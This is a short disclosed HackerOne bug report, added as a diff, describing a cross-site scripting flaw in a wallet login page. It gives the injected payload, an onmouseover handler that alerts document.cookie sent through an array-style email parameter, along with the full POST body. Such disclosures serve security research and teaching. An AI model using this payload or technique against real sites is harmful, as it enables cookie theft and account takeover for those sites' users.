@@ -1,0 +1,18 @@
+ReportLink:https://hackerone.com/reports/63888
+WeaknessName:Cross-site Scripting (XSS) - Generic
+Reporter:https://hackerone.com/jaikeysarraf
+ReportedTo:Enter(enter)
+BountyAmount:50.0
+Severity:
+State:Closed
+DateOfDisclosure:12.07.2015 18:45:43
+
+Summary:
+
+page : 
+https://wallet.romit.io/login
+
+post data "email=xxx@xxx.com" set to "email[]=<a onmouseover=alert(document.cookie)>xxs link</a>"
+
+full request data 
+email[]=<a onmouseover=alert(document.cookie)>xxs link</a>&password=g00dPa%24%24w0rD&_csrf=5afeda5f-e604-4ba0-bd60-d83f975853c5
